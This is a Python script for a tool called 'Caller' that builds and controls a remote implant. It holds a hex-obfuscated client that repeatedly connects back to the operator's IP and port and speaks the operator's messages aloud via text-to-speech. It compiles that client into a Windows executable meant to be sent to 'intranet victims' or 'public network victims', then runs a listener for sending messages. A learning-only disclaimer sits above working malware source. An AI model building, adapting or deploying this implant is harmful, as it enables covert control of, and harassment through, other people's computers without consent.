#!/usr/bin/python3
# @Мартин.
import socket
import base64
import sys,textwrap,argparse,subprocess
from loguru import logger

version = "@Мартин. Caller Tool V1.0.0 for Windows"
title = '''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, 
or you will bear corresponding legal responsibilities
************************************************************************************'''
logo = f'''                                                                    
   ____     ____     _____       _____        _____   ______    
  / ___)   (    )   (_   _)     (_   _)      / ___/  (   __ \   
 / /       / /\ \     | |         | |       ( (__     ) (__) )  
( (       ( (__) )    | |         | |        ) __)   (    __/   
( (        )    (     | |   __    | |   __  ( (       ) \ \  _  
 \ \___   /  /\  \  __| |___) ) __| |___) )  \ \___  ( ( \ \_)) 
  \____) /__(  )__\ \________/  \________/    \____\  )_) \__/  
                Github==>https://github.com/MartinxMax
                {version}'''


def myip():
    return socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)[0][4][0]


def init_loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class MainServer():


    def __init__(self,args):
        self.payload_code = b'\x69\x6D\x70\x6F\x72\x74\x20\x74\x69\x6D\x65\x0A\x69\x6D\x70\x6F\x72\x74\x20\x70\x79\x74\x74\x73\x78\x33\x0A\x69\x6D\x70\x6F\x72\x74\x20\x73\x6F\x63\x6B\x65\x74\x0A\x69\x6D\x70\x6F\x72\x74\x20\x62\x61\x73\x65\x36\x34\x0A\x0A\x63\x6C\x61\x73\x73\x20\x4D\x61\x69\x6E\x28\x29\x3A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x5F\x5F\x69\x6E\x69\x74\x5F\x5F\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x6E\x67\x69\x6E\x65\x20\x3D\x20\x70\x79\x74\x74\x73\x78\x33\x2E\x69\x6E\x69\x74\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x6E\x67\x69\x6E\x65\x2E\x73\x65\x74\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x27\x72\x61\x74\x65\x27\x2C\x20\x32\x30\x30\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x6E\x67\x69\x6E\x65\x2E\x73\x65\x74\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x27\x76\x6F\x6C\x75\x6D\x65\x27\x2C\x20\x35\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x5F\x5F\x72\x65\x63\x76\x28\x73\x65\x6C\x66\x2C\x73\x6F\x63\x6B\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x77\x68\x69\x6C\x65\x20\x54\x72\x75\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x74\x72\x79\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x3D\x20\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x64\x65\x63\x6F\x64\x65\x28\x73\x6F\x63\x6B\x2E\x72\x65\x63\x76\x28\x32\x30\x34\x38\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x27\x75\x74\x66\x2D\x38\x27\x29\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x27\x75\x74\x66\x2D\x38\x27\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x20\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x20\x61\x73\x20\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x6F\x63\x6B\x2E\x63\x6C\x6F\x73\x65\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6E\x20\x46\x61\x6C\x73\x65\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6C\x73\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x27\x65\x78\x69\x74\x27\x20\x69\x6E\x20\x6D\x65\x73\x73\x61\x67\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x6F\x63\x6B\x2E\x63\x6C\x6F\x73\x65\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6E\x20\x46\x61\x6C\x73\x65\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6C\x73\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x5F\x5F\x73\x61\x79\x28\x6D\x65\x73\x73\x61\x67\x65\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x5F\x5F\x73\x61\x79\x28\x73\x65\x6C\x66\x2C\x6D\x65\x73\x73\x61\x67\x65\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x6E\x67\x69\x6E\x65\x2E\x73\x61\x79\x28\x6D\x65\x73\x73\x61\x67\x65\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x6E\x67\x69\x6E\x65\x2E\x72\x75\x6E\x41\x6E\x64\x57\x61\x69\x74\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x63\x6F\x6E\x6E\x65\x74\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x74\x72\x79\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x6C\x69\x65\x6E\x74\x5F\x73\x6F\x63\x6B\x65\x74\x20\x3D\x20\x73\x6F\x63\x6B\x65\x74\x2E\x73\x6F\x63\x6B\x65\x74\x28\x73\x6F\x63\x6B\x65\x74\x2E\x41\x46\x5F\x49\x4E\x45\x54\x2C\x20\x73\x6F\x63\x6B\x65\x74\x2E\x53\x4F\x43\x4B\x5F\x53\x54\x52\x45\x41\x4D\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x5F\x61\x64\x64\x72\x65\x73\x73\x20\x3D\x20\x28\x27\x40\x49\x50\x27\x2C\x20\x40\x50\x4F\x52\x54\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x6C\x69\x65\x6E\x74\x5F\x73\x6F\x63\x6B\x65\x74\x2E\x63\x6F\x6E\x6E\x65\x63\x74\x28\x73\x65\x72\x76\x65\x72\x5F\x61\x64\x64\x72\x65\x73\x73\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x70\x61\x73\x73\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6C\x73\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x6E\x6F\x74\x20\x73\x65\x6C\x66\x2E\x5F\x5F\x72\x65\x63\x76\x28\x63\x6C\x69\x65\x6E\x74\x5F\x73\x6F\x63\x6B\x65\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x6C\x69\x65\x6E\x74\x5F\x73\x6F\x63\x6B\x65\x74\x2E\x63\x6C\x6F\x73\x65\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6E\x20\x46\x61\x6C\x73\x65\x0A\x0A\x69\x66\x20\x5F\x5F\x6E\x61\x6D\x65\x5F\x5F\x20\x3D\x3D\x20\x27\x5F\x5F\x6D\x61\x69\x6E\x5F\x5F\x27\x3A\x0A\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x20\x3D\x20\x4D\x61\x69\x6E\x28\x29\x0A\x20\x20\x20\x20\x77\x68\x69\x6C\x65\x20\x54\x72\x75\x65\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2E\x63\x6F\x6E\x6E\x65\x74\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x74\x69\x6D\x65\x2E\x73\x6C\x65\x65\x70\x28\x33\x29'
        self.localhost=args.LHOST
        self.localport = int(args.LPORT)
        self.remotehost = args.RHOST
        self.mode_g = args.GENERATE
        if self.mode_g:
            self.__generatePayload()
        self.__run()


    def __generatePayload(self):
        result_release = True
        payload_debug = (self.payload_code.decode('utf-8').replace('@IP',self.localhost).replace('@PORT',str(self.localport))).encode('utf-8')
        try:
            if self.remotehost:
                payload_release = (self.payload_code.decode('utf-8').replace('@IP',self.remotehost.split(':')[0]).replace('@PORT',self.remotehost.split(':')[-1])).encode('utf-8')
                with open('./temp_release.py', 'wb') as f:
                    f.write(payload_release)
            with open('./temp_debug.py', 'wb') as f:
                f.write(payload_debug)
        except Exception as e:
            print(e)
            pass
        else:
            logger.warning('Generating debug version (you can send this version to intranet victims)')
            result_debug = subprocess.call(f'pyinstaller -F ./temp_debug.py -n Caller_debug', shell=True,
                                           stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
            if self.remotehost:
                logger.warning('Generating a release version (you can send it to public network victims)')
                result_release = subprocess.call(f'pyinstaller -F ./temp_release.py -n Caller_release', shell=True, stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
            if not result_debug :
                if not result_release:
                    subprocess.call('del "./temp_release.py"', shell=True, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                subprocess.call('del "./temp_debug.py"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            else:
                logger.error('You can enter \'pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller\' to download the package')
                return False


    def __run(self):
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = ('', self.localport)
        self.__server_socket.bind(server_address)
        self.__server_socket.listen(1)
        self.__listener()


    def __listener(self):
        logger.info(f"Service started successfully [{self.localhost}:{self.localport}]")
        while True:
            client_socket, client_address = self.__server_socket.accept()
            logger.warning("Client->"+str(client_address[0])+":"+str(client_address[-1]))
            while True:
                reply = input(f"<- [{str(client_address[0])}] to say (exit):")
                if 'exit' in reply or getattr(client_socket, '_closed') == True:
                    logger.error(f"Disconnect [{str(client_address[0])}]")
                    client_socket.sendall(base64.b64encode('exit'.encode('utf-8')))
                    client_socket.close()
                    self.__server_socket.close()
                    return False
                else:
                    try:
                        client_socket.sendall(base64.b64encode(reply.encode('utf-8')))
                    except Exception as e:
                        logger.error(f"Disconnect [{str(client_address[0])}]")
                        break


if __name__ == '__main__':
    init_loger()
    print(logo,title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {caller} -lh 192.168.101.1 -lp <10032> # Bind local IP and port
                python3 {caller} -g # Generate Payload
                python3 {caller} -rh <IP:PORT>[TCP] -lp <10032> -g # Use intranet penetration to bind local port 10032 and generate payload

                '''.format(caller=sys.argv[0])))
    parser.add_argument('-lh', '--LHOST',default=myip(), help='Listen_IP')
    parser.add_argument('-lp', '--LPORT', default=int("10032"), help='Listen_PORT')
    parser.add_argument('-rh', '--RHOST', default="", help='Port_forwarding_server')
    parser.add_argument('-g', '--GENERATE', action='store_true', help='Biulding Payload')
    args = parser.parse_args()
    MainServer(args)